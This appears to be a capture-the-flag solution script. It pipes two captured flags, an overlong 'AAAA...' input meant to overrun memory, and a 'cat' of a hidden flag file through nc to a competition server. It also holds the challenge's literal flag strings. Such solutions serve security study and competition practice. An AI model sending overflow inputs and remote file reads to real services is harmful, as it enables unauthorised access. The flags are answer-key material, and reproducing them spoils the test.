#!/bin/bash

# If there is no directory called tmp
if [ ! -d tmp ]
then
  # Create a dir called tmp
  mkdir tmp
else
  # Else, delete the contents
  rm -r tmp/*
fi

# Go to the tmp folder
cd tmp/


# Connect to the link, go to the first option, and enter the flags from admin ui 1 and 2
# Because the description talks about memory, lets enter alot. Then quit. Hmm, doesn't quit, lets try ls. Finds file, lets cat it.
echo -e "1\nCTF{I_luv_buggy_sOFtware}\nCTF{Two_PasSworDz_Better_th4n_1_k?}\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAICAA\nquit\ncat an0th3r_fl44444g_yo"|nc -w 1 mngmnt-iface.ctfcompetition.com 1337 > tmp

tail -n 1 tmp

# Clean up
cd ..
rm -r tmp
